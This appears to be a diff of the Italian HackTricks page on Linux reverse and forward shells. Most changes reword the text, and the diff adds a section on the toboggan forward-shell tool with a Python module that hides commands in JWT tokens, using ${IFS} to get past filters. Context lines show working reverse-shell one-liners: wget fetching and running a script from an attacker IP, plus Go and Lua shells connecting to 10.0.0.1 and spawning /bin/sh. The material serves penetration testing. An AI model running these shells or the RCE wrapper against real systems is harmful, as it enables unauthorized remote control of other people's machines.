@@ -6,7 +6,7 @@
 
 Altri modi per supportare HackTricks:
 
-* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -14,7 +14,7 @@ Altri modi per supportare HackTricks:
 
 </details>
 
-**Se hai domande su una di queste shell, puoi controllarle con** [**https://explainshell.com/**](https://explainshell.com)
+**Se hai domande su una di queste shell puoi controllarle con** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
@@ -57,17 +57,50 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell in Avanti
 
-Se incontri una vulnerabilità **RCE** all'interno di un'applicazione web basata su Linux, potrebbero esserci casi in cui **diventa difficile ottenere una shell inversa** a causa della presenza di regole Iptables o di altri filtri. In tali scenari, considera la creazione di una shell PTY all'interno del sistema compromesso utilizzando i pipe.
+Quando si tratta di una vulnerabilità di **Esecuzione di Codice Remoto (RCE)** all'interno di un'applicazione web basata su Linux, ottenere una shell inversa potrebbe essere ostacolato dalle difese di rete come le regole iptables o meccanismi di filtraggio dei pacchetti intricati. In tali ambienti limitati, un approccio alternativo prevede l'instaurazione di una shell PTY (Pseudo Terminale) per interagire in modo più efficace con il sistema compromesso.
 
-Puoi trovare il codice su [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
+Uno strumento consigliato per questo scopo è [toboggan](https://github.com/n3rada/toboggan.git), che semplifica l'interazione con l'ambiente di destinazione.
 
-Devi solo modificare:
+Per utilizzare toboggan in modo efficace, creare un modulo Python adattato al contesto RCE del sistema di destinazione. Ad esempio, un modulo chiamato `nix.py` potrebbe essere strutturato come segue:
+```python3
+import jwt
+import httpx
+
+def execute(command: str, timeout: float = None) -> str:
+# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
+token = jwt.encode(
+{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
+)
+
+response = httpx.get(
+url="https://vulnerable.io:3200",
+headers={"Authorization": f"Bearer {token}"},
+timeout=timeout,
+# ||BURP||
+verify=False,
+)
+
+# Check if the request was successful
+response.raise_for_status()
+
+return response.text
+```
+E poi, puoi eseguire:
+```shell
+toboggan -m nix.py -i
+```
+Per sfruttare direttamente una shell interattiva. È possibile aggiungere `-b` per l'integrazione con Burpsuite e rimuovere `-i` per un wrapper rce più basilare.
+
+
+Un'altra possibilità consiste nell'utilizzare l'implementazione della shell in avanti di `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+
+È sufficiente modificare:
 
 * L'URL dell'host vulnerabile
-* Il prefisso e il suffisso del tuo payload (se presente)
+* Il prefisso e il suffisso del payload (se presente)
 * Il modo in cui il payload viene inviato (intestazioni? dati? informazioni extra?)
 
-Quindi, puoi semplicemente **inviare comandi** o addirittura **usare il comando `upgrade`** per ottenere una PTY completa (nota che i pipe vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
+Quindi, è possibile **inviare comandi** o addirittura **usare il comando `upgrade`** per ottenere un PTY completo (nota che i tubi vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
 
 ## Netcat
 ```bash
@@ -151,7 +184,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 ```
 ## Lua
 
-Lua è un linguaggio di scripting leggero e potente che può essere incorporato in applicazioni per fornire flessibilità e estensibilità. È ampiamente utilizzato per scripting, sviluppo di giochi e applicazioni embedded. Lua è noto per la sua semplicità, velocità ed efficienza.
+Lua è un linguaggio di scripting leggero e potente che può essere incorporato in applicazioni per fornire flessibilità e estensibilità. È spesso utilizzato per scrivere script di automazione, estendere funzionalità di applicazioni esistenti e creare plugin. Lua è noto per la sua semplicità e velocità, rendendolo una scelta popolare tra gli sviluppatori.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -310,7 +343,7 @@ Altri modi per supportare HackTricks:
 * Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**PEASS ufficiale & HackTricks swag**](https://peass.creator-spring.com)
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**Gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
